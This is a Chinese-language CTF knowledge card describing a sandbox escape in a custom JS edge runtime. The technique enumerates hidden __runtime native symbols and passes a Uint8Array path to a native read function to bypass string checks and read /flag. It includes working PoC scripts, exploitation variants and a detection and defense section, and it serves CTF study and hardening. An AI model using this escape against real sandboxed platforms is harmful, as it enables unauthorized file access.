---
id: ctf-web-js-runtime-internal-symbol-uint8array-sandbox-escape
title: JS 边缘运行时沙箱逃逸：枚举 __runtime 内部符号 + Uint8Array 路径绕过字符串检查读文件
type: scenario
domain: ctf
path: ctf/web
technique: js-runtime-internal-symbol-uint8array-sandbox-escape
tags:
- ctf
- web
- javascript
- sandbox-escape
- runtime-internals
- uint8array
- type-confusion
- file-read
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:11:19+08:00'
  notes: 已对照原文与图核对：业务代码仅 export default fetch、__runtime.platform 暴露、getOwnPropertyNames(__runtime) 发现 _0x72656164/_0x6c697374（hex 解码为 read/list）、TextEncoder().encode("/flag") 的 Uint8Array 路径传给 readFn 均与原文一致。原文未展示最终 flag/运行结果，卡片标 confidence=low 合理。未验证点：PoC 未实际运行；原文无版本信息；frontmatter 无 sources/source_url。
url: /docs/ctf/web/ctf-web-js-runtime-internal-symbol-uint8array-sandbox-escape/
draft: false
kb_aliases:
- BunEdge 沙箱逃逸
- __runtime 内部符号
- _0x72656164
- _0x6c697374
- TextEncoder Uint8Array 绕过
- JS 运行时类型混淆
---

## 一句话结论

在只暴露 `__runtime` 的 JS 边缘运行时里，先用 `Object.getOwnPropertyNames(__runtime)` 枚举内部结构，找到 `_internal.lib.symbols` 中混淆命名的原生函数（`_0x72656164` 对应 `read`、`_0x6c697374` 对应 `list`），再把路径编码成 `TextEncoder().encode("/flag")` 的 `Uint8Array` 传给原生 `readFn`，绕过只接受字符串/做字符串拼接检查的沙箱限制，读取 `/flag`。

## 原理

- **自定义运行时暴露内部对象**：BunEdge 类平台在全局注入 `__runtime`，正常业务只用 `__runtime.platform`；但 `Object.getOwnPropertyNames(__runtime)` 可看到 `_internal`、`lib`、`symbols` 等内部结构，符号名用十六进制混淆（如 `_0x72656164`）。
- **混淆名解码**：`0x72 0x65 0x61 0x64` = `read`，`0x6c 0x69 0x73 0x74` = `list`；这些是底层 C++ 扩展暴露的原生文件操作函数，本不应被业务代码直接调用。
- **类型检查绕过**：沙箱/包装层可能只校验路径是字符串，或对字符串做前缀/拼接检查；`new TextEncoder().encode("/flag")` 返回 `Uint8Array`，不是字符串，能绕过 `typeof path === "string"`、`path.startsWith("/")` 等检查；原生绑定可能直接把 `Uint8Array` 当作字节缓冲区/路径接受。
- **绝对路径**：直接传 `/flag`，不经过沙箱允许目录的字符串拼接；若原生 `read` 以进程权限打开文件，即可读到 flag。
- **为什么成立**：沙箱的信任边界建立在“业务只能拿到受限的字符串 API”上，但 `__runtime` 把原生符号泄漏到 JS 层；一旦能调用原生 `read`，字符串/路径校验就被绕过。
- **注意**：原文只给出探测思路与 payload，未展示最终 flag/运行结果；本卡按低置信度记录，实际利用需按目标运行时版本验证 `symbols` 结构与 `readFn` 的参数类型。

## 触发条件

- 目标是一个自定义 JS 边缘运行时/沙箱（如 BunEdge），业务代码只能写 `export default { async fetch(request) {...} }`。
- 全局暴露 `__runtime`（或类似内部对象），且未冻结/隔离其 `_internal` 属性。
- 沙箱只对字符串路径做校验，底层原生函数接受 `Uint8Array`/Buffer 等类型。
- 进程对 `/flag` 有读权限。

## 利用步骤

1. 先确认 `__runtime` 存在，打印 `Object.getOwnPropertyNames(__runtime)`、`Object.getOwnPropertyNames(__runtime._internal || {})`，枚举内部结构。
2. 找到 `lib.symbols`，列出符号名；把 `_0x...` 按十六进制解码成 ASCII，识别 `read`、`list`、`open` 等原生函数。
3. 构造路径 `new TextEncoder().encode("/flag")`，调用 `readFn(path)`；若返回字节/字符串，包装成 `Response` 输出。
4. 若 `readFn` 只接受字符串，尝试 `Buffer.from("/flag")`、`Array.from(...)`、`new Uint8Array([...])` 等类型变体，观察原生绑定的类型转换。
5. 若 `read` 不可用，尝试 `list` 枚举目录、`open` + `read` 组合，或通过 `_internal` 其他方法读取。
6. 用返回内容确认 flag；若被沙箱捕获异常，读取错误信息中的路径/类型提示调整。

## PoC

```javascript
export default {
  async fetch(req) {
    const symbols = __runtime._internal.lib.symbols;
    const readFn = symbols._0x72656164;          // "read"
    const path = new TextEncoder().encode("/flag"); // Uint8Array，绕过字符串检查
    const flag = readFn(path);
    return new Response(flag);
  }
}
```

探测内部结构：

```javascript
export default {
  async fetch(req) {
    const names = Object.getOwnPropertyNames(__runtime);
    const internal = __runtime._internal
      ? Object.getOwnPropertyNames(__runtime._internal)
      : [];
    const symbols = __runtime._internal?.lib?.symbols
      ? Object.getOwnPropertyNames(__runtime._internal.lib.symbols)
      : [];
    return new Response(JSON.stringify({ names, internal, symbols }, null, 2));
  }
}
```

## 变体与关联

- **符号变体**：`_0x6c697374`（list）、`_0x6f70656e`（open）、`_0x7772697465`（write）等；按十六进制解码识别。
- **类型变体**：`Uint8Array`、`Buffer`、`ArrayBuffer`、普通数组、对象 `{toString(){...}}`；观察原生绑定的类型转换。
- **访问路径变体**：`__runtime._internal`、`__runtime.lib`、`globalThis` 上的隐藏属性、原型链上的 getter。
- **关联卡片**：[[web-nodejs-n8n-expression-sandbox-escape-rce]]（JS 表达式沙箱逃逸）、[[web-nodejs-vm2-buffer-slab-jwt-secret-leak]]（vm2/类型混淆读内存）、[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node vm 沙箱逃逸）。
- **边界**：`__runtime` 被冻结/代理、原生函数只接受字符串、沙箱用进程级 seccomp/容器隔离、flag 不可读时失效。

## 检测与防御

- **检测特征**：业务代码访问 `__runtime._internal`/`lib.symbols`、枚举 `_0x...` 属性、把 `Uint8Array` 传给文件 API；运行时出现非业务原生调用。
- **修复**：不要向沙箱暴露原生符号/内部对象；冻结 `__runtime`，只暴露白名单 API；原生文件函数强制 `typeof path === "string"` 并在 C++ 层做路径校验；沙箱用独立进程/容器与 seccomp 限制文件访问。
- **最小权限**：沙箱进程只挂载必要目录，flag 不可读；对 `read`/`list` 调用做审计与速率限制。
